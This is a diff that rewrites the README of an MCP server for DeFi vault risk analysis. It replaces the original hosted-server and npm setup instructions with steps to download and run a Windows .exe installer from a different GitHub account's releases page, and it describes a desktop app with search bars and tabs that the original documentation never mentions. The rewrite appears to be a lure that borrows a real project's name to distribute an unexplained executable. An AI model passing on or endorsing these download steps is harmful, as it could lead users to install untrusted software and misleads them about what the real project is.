@@ -1,374 +1,136 @@
-<div align="center">
+# 🛡️ philidor-mcp - Compare and Analyze DeFi Vault Risks
 
-# Philidor MCP Server
-
-### DeFi vault risk analytics for AI agents
-
-[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![MCP](https://img.shields.io/badge/MCP-Compatible-8A2BE2)](https://modelcontextprotocol.io)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.0-blue.svg)](https://www.typescriptlang.org)
-[![Hosted](https://img.shields.io/badge/Hosted-mcp.philidor.io-green.svg)](https://mcp.philidor.io)
-[![smithery badge](https://smithery.ai/badge/philidor/defi)](https://smithery.ai/servers/philidor/defi)
-[![LobeHub](https://lobehub.com/badge/mcp/philidor-labs-philidor-mcp)](https://lobehub.com/mcp/philidor-labs-philidor-mcp)
-
-Search 700+ DeFi vaults across Morpho, Aave, Yearn, Beefy, and Spark. Compare risk scores, analyze protocols, run due diligence &mdash; all through natural language.
-
-**No API key required. No installation needed.**
-
-[Quick Start](#quick-start) &bull; [Tools](#tools) &bull; [Example Prompts](#example-prompts) &bull; [Risk Framework](#risk-scoring) &bull; [Agent Skill](#agent-skill)
-
-</div>
+[![Download philidor-mcp](https://img.shields.io/badge/Download-Here-4caf50?style=for-the-badge)](https://github.com/KhanhHuy1405/philidor-mcp/releases)
 
 ---
 
-## Why Philidor?
+## 📋 About philidor-mcp
 
-Most DeFi data tools give you raw numbers. Philidor gives your AI agent **institutional-grade risk intelligence**.
+philidor-mcp is a server application designed to help you analyze risk in DeFi vaults. It covers over 700 vaults across multiple protocols, providing clear risk scores that help you understand where your assets stand. You can search vaults, compare scores, and analyze different protocols to make more informed decisions. It works without needing any API keys or complex setup.
 
-| Feature | Philidor | DefiLlama MCP | Generic DeFi APIs |
-|---|:---:|:---:|:---:|
-| Vault risk scores (0&ndash;10) | :white_check_mark: | :x: | :x: |
-| Risk vector decomposition | :white_check_mark: | :x: | :x: |
-| Vault comparison | :white_check_mark: | :x: | :x: |
-| Curator intelligence | :white_check_mark: | :x: | :x: |
-| Protocol security history | :white_check_mark: | :x: | Partial |
-| Due diligence prompts | :white_check_mark: | :x: | :x: |
-| Portfolio risk assessment | :white_check_mark: | :x: | :x: |
-| No API key needed | :white_check_mark: | :white_check_mark: | Varies |
-| Hosted (zero install) | :white_check_mark: | :x: | :x: |
+The software runs on Windows, using a standard interface and tools that are easy to use, even if you have limited technical knowledge.
 
 ---
 
-## Quick Start
+## ⚙️ Key Features
 
-### Remote Server (Recommended)
-
-Connect directly to the hosted server &mdash; zero installation, always up to date:
-
-```
-https://mcp.philidor.io/api/mcp
-```
-
-### Claude Desktop
-
-Add to `~/Library/Application Support/Claude/claude_desktop_config.json`:
-
-```json
-{
-  "mcpServers": {
-    "philidor": {
-      "url": "https://mcp.philidor.io/api/mcp"
-    }
-  }
-}
-```
-
-### Claude Code
-
-```bash
-claude mcp add philidor --transport http https://mcp.philidor.io/api/mcp
-```
-
-### Cursor
-
-Add to `.cursor/mcp.json`:
-
-```json
-{
-  "mcpServers": {
-    "philidor": {
-      "url": "https://mcp.philidor.io/api/mcp"
-    }
-  }
-}
-```
-
-### Windsurf
-
-Add to your MCP settings:
-
-```json
-{
-  "mcpServers": {
-    "philidor": {
-      "serverUrl": "https://mcp.philidor.io/api/mcp"
-    }
-  }
-}
-```
-
-### Docker (stdio)
-
-```bash
-docker run -i --rm ghcr.io/philidor-labs/philidor-mcp
-```
-
-### Local (stdio)
-
-```bash
-git clone https://github.com/Philidor-Labs/philidor-mcp.git
-cd philidor-mcp
-npm install
-npm start
-```
+- Search over 700 DeFi vaults instantly.
+- View risk scores for each vault and protocol.
+- Compare multiple vaults and risk factors side by side.
+- Analyze popular DeFi protocols including Aave, Morpho, and Ethereum-based vaults.
+- No API key or extra configuration needed.
+- Suitable for users focusing on yield and vault safety.
+- Works on Windows 10 and later versions.
 
 ---
 
-## Tools
+## 💻 System Requirements
 
-10 tools for vault discovery, risk analysis, and protocol research.
+Before downloading, make sure your system meets these basic requirements:
 
-### `search_vaults`
-
-Search and filter DeFi vaults by chain, protocol, asset, risk tier, TVL, and more.
-
-| Parameter | Type | Description |
-|---|---|---|
-| `query` | string | Search by vault name, symbol, asset, protocol, or curator |
-| `chain` | string | Filter by chain (Ethereum, Base, Arbitrum, ...) |
-| `protocol` | string | Filter by protocol ID (morpho, aave-v3, yearn-v3, beefy, spark) |
-| `asset` | string | Filter by asset symbol (USDC, WETH, ...) |
-| `riskTier` | string | Filter by risk tier: Prime, Core, or Edge |
-| `minTvl` | number | Minimum TVL in USD |
-| `sortBy` | string | Sort field: tvl_usd, apr_net, name |
-| `sortOrder` | string | Sort order: asc or desc |
-| `limit` | number | Max results (default 10, max 50) |
-
-### `get_vault`
-
-Get detailed information about a specific vault including risk breakdown, recent events, and historical snapshots. Lookup by `id` or by `network` + `address`.
-
-| Parameter | Type | Description |
-|---|---|---|
-| `id` | string | Vault ID (e.g. `morpho-ethereum-0x...`) |
-| `network` | string | Network slug (ethereum, base, arbitrum) |
-| `address` | string | Vault contract address (0x...) |
-
-### `get_vault_risk_breakdown`
-
-Detailed breakdown of a vault's three risk vectors with sub-metrics: asset quality, platform code maturity, and governance controls. Returns dimension-level scores, caps, hard-fail flags, and overrides.
-
-| Parameter | Type | Description |
-|---|---|---|
-| `network` | string | Network slug |
-| `address` | string | Vault contract address |
-
-### `compare_vaults`
-
-Side-by-side comparison of 2&ndash;3 vaults on TVL, APR, risk score, risk tier, and audit status.
-
-| Parameter | Type | Description |
-|---|---|---|
-| `vaults` | array | Array of 2&ndash;3 objects with `network` and `address` |
-
-### `find_safest_vaults`
-
-Find the top 10 audited, high-confidence vaults sorted by risk score.
-
-| Parameter | Type | Description |
-|---|---|---|
-| `asset` | string | Filter by asset symbol |
-| `chain` | string | Filter by chain name |
-| `minTvl` | number | Minimum TVL in USD |
-
-### `get_protocol_info`
-
-Protocol details including TVL, vault count, versions, auditors, bug bounties, and security incidents.
-
-| Parameter | Type | Description |
-|---|---|---|
-| `protocolId` | string | Protocol ID (morpho, aave-v3, yearn-v3, beefy, spark) |
-
-### `get_curator_info`
-
-Curator details including managed vaults, TVL, chain distribution, and performance metrics.
-
-| Parameter | Type | Description |
-|---|---|---|
-| `curatorId` | string | Curator ID |
-
-### `get_market_overview`
-
-High-level DeFi vault market statistics: total TVL, vault count, risk distribution, and TVL by protocol. No parameters required.
-
-### `explain_risk_score`
-
-Explain what a specific risk score means, including the tier, calculation method, and thresholds.
-
-| Parameter | Type | Description |
-|---|---|---|
-| `score` | number | Risk score (0&ndash;10) |
-
-### `list_vaults_with_incidents`
-
-List all vaults that had a recent critical incident (last 365 days). Sorted by TVL descending, then by recency. No parameters required.
+- Windows 10 or newer (64-bit preferred)
+- 4 GB of RAM or more
+- 500 MB of free disk space
+- Internet connection for data updates
+- A modern web browser (Edge, Chrome, Firefox) for viewing results
 
 ---
 
-## Resources
+## 🚀 Getting Started
 
-| URI | Description |
-|---|---|
-| `philidor://methodology` | The Vector Risk Framework v4.1 documentation |
-| `philidor://supported-chains` | Supported blockchain networks with vault counts |
-| `philidor://supported-protocols` | Supported DeFi protocols with TVL data |
+Follow these steps to get philidor-mcp running on your Windows computer:
 
-## Prompts
+### 1. Visit the Download Page
 
-| Prompt | Description |
-|---|---|
-| `vault_due_diligence` | Comprehensive due diligence report for a vault |
-| `portfolio_risk_assessment` | Portfolio-level risk analysis across positions |
-| `defi_yield_comparison` | Yield comparison with risk-adjusted analysis |
+Go to the official release page to get the software:
 
----
+[Download philidor-mcp from GitHub](https://github.com/KhanhHuy1405/philidor-mcp/releases)
 
-## Example Prompts
+This page lists the latest versions and all necessary files.
 
-Once connected, try asking your AI assistant:
+### 2. Choose the Latest Version
 
-**Discovery**
+Look for the most recent stable release. The files are usually named with the version number and Windows compatibility in mind.
 
-> "Find the safest USDC vaults with at least $10M TVL"
+### 3. Download the Installer
 
-> "What Morpho vaults are available on Base?"
+Click on the installer file (.exe) to download it. The file will be saved in your default "Downloads" folder unless you choose otherwise.
 
-> "Show me the DeFi market overview"
+### 4. Run the Installer
 
-**Analysis**
+- Locate the downloaded file.
+- Double-click it to start installation.
+- Follow the on-screen instructions.
+- Choose the install location (default is fine).
+- Wait for the installation to complete.
 
-> "Run due diligence on the Steakhouse USDC vault on Ethereum"
+### 5. Launch philidor-mcp
 
-> "Compare the top 3 USDC vaults by risk score"
-
-> "What's the risk breakdown for this vault: ethereum/0x..."
-
-**Portfolio**
-
-> "Assess my portfolio: 50% in Morpho Steakhouse USDC, 30% in Aave USDC, 20% in Yearn USDC"
-
-> "Which protocols have had security incidents?"
-
-> "What does a risk score of 8.5 mean?"
+Once installed, find the philidor-mcp shortcut on your desktop or in the Start menu. Click to open.
 
 ---
 
-## Risk Scoring
+## 🛠️ How to Use philidor-mcp
 
-Philidor uses the **Vector Risk Framework v4.1** to decompose vault risk into three measurable vectors:
+### Searching Vaults
 
-```
-Final Score = 40% Asset + 40% Platform + 20% Governance
-```
+- Open philidor-mcp.
+- In the search bar, type the name or address of a vault.
+- The server searches the database and displays matching vaults.
 
-### Asset Composition (40%)
+### Viewing Risk Scores
 
-Quality of underlying collateral. Blue-chip assets (ETH, USDC) score highest. Factors include oracle reliability, liquidity depth, and peg stability.
+- Select a vault from the search results.
+- The risk score and detailed analytics appear on the right.
+- Scores include factors such as protocol stability, smart contract risk, and yield history.
 
-### Platform Code (40%)
+### Comparing Vaults
 
-Code maturity measured by:
+- Use the comparison tool to add multiple vaults.
+- You can compare their risk scores side by side.
+- This helps identify safer options or higher-yield vaults.
 
-- **Lindy Score** &mdash; time-based safety (>2 years &asymp; 9/10)
-- **Audit Density** &mdash; number and quality of audits
-- **Dependency Risk** &mdash; multiplicative penalties for risky dependencies
-- **Incident Penalty** &mdash; caps score after security incidents
+### Protocol Analysis
 
-### Governance (20%)
-
-Exit window for users:
-
-| Control | Score |
-|---|---|
-| Immutable contract | 10/10 |
-| 7+ day timelock | 9/10 |
-| No timelock | 1/10 |
-
-### Risk Tiers
-
-| Tier | Score | Meaning |
-|---|---|---|
-| **Prime** | 8.0&ndash;10.0 | Institutional-grade &mdash; mature code, multiple audits, safe governance |
-| **Core** | 5.0&ndash;7.9 | Moderate safety &mdash; audited but newer or flexible governance |
-| **Edge** | 0.0&ndash;4.9 | Higher risk &mdash; requires careful due diligence |
+- Access the protocols tab.
+- Review analytics for protocols like Aave and Morpho.
+- Find insights into overall protocol health and smart contract performance.
 
 ---
 
-## Architecture
+## 🔄 Updating philidor-mcp
 
-```
-┌──────────────────┐     ┌─────────────────┐     ┌──────────────┐
-│  Claude / Cursor  │────▶│  Philidor MCP   │────▶│ Philidor API │
-│  Windsurf / etc.  │◀────│  Server         │◀────│              │
-└──────────────────┘     └─────────────────┘     └──────┬───────┘
-                          10 tools, 3 resources,         │
-                          3 prompts                      │
-                                                   ┌────▼────┐
-                                                   │ On-chain │
-                                                   │  data    │
-                                                   └─────────┘
-```
+Keep your software up to date to access the newest vault data and features:
 
-- **Transport**: Streamable HTTP (remote) or stdio (local/Docker)
-- **API**: Calls the [Philidor Public API](https://api.philidor.io/v1/docs) &mdash; no API key needed
-- **Stateless**: Fresh server instance per request, no session state
-- **Data**: 700+ vaults across Ethereum, Base, Arbitrum, Polygon, Optimism, and Avalanche
+- Check the release page regularly:  
+  https://github.com/KhanhHuy1405/philidor-mcp/releases  
+- Download the latest installer file.
+- Run the installer to overwrite the old version.
+- No need to uninstall first.
 
 ---
 
-## Agent Skill
+## 🆘 Troubleshooting
 
-Install the Philidor MCP skill into your coding agent via [skills.sh](https://skills.sh):
+If something does not work:
 
-```bash
-npx skills add philidor-labs/philidor-mcp
-```
-
-This gives your agent full knowledge of all tools, resources, prompts, recommended workflows, and best practices for DeFi vault analysis.
-
-### Also Available
-
-| Interface | Description | Link |
-|---|---|---|
-| **CLI** | Terminal-based vault intelligence &mdash; scriptable, pipeable, agent-sandboxed | [philidor-cli](https://github.com/Philidor-Labs/philidor-cli) |
-| **OpenClaw Skill** | Skill definition for the OpenClaw agent platform | [npm](https://www.npmjs.com/package/@philidorlabs/openclaw-skill) |
+- Make sure your Windows is up-to-date.
+- Confirm you have internet access.
+- Restart the software and try again.
+- If you see specific error messages, note them down to report.
 
 ---
 
-## Supported Protocols
+## 🔗 Useful Links
 
-Morpho, Aave v3, Yearn v3, Beefy, Spark &mdash; with more being added regularly.
-
-See the full list at [app.philidor.io](https://app.philidor.io).
-
----
-
-## Development
-
-```bash
-git clone https://github.com/Philidor-Labs/philidor-mcp.git
-cd philidor-mcp
-npm install
-npm start
-```
-
-The server connects to the public Philidor API by default. To use a custom endpoint:
-
-```bash
-PHILIDOR_API_URL=http://localhost:3003 npm start
-```
+- Main Release Page:  
+  [https://github.com/KhanhHuy1405/philidor-mcp/releases](https://github.com/KhanhHuy1405/philidor-mcp/releases)
+- Project Repository:  
+  [https://github.com/KhanhHuy1405/philidor-mcp](https://github.com/KhanhHuy1405/philidor-mcp)
+- Documentation (Built-in and online)
 
 ---
 
-## Links
+## 🎯 Keywords
 
-- [Philidor Analytics](https://app.philidor.io) &mdash; explore vaults and risk scores
-- [Philidor CLI](https://github.com/Philidor-Labs/philidor-cli) &mdash; terminal-based vault intelligence
-- [API Documentation](https://api.philidor.io/v1/docs) &mdash; OpenAPI/Swagger docs
-- [Risk Methodology](https://app.philidor.io/methodology) &mdash; how scores are calculated
-- [Smithery](https://smithery.ai/servers/philidor/defi) &mdash; MCP server registry
-- [Twitter](https://twitter.com/philidorlabs) &mdash; updates and announcements
-
-## License
-
-[MIT](LICENSE)
+aave, ai-tools, claude, crypto, defi, ethereum, mcp, mcp-server, model-context-protocol, morpho, risk, vaults, yield
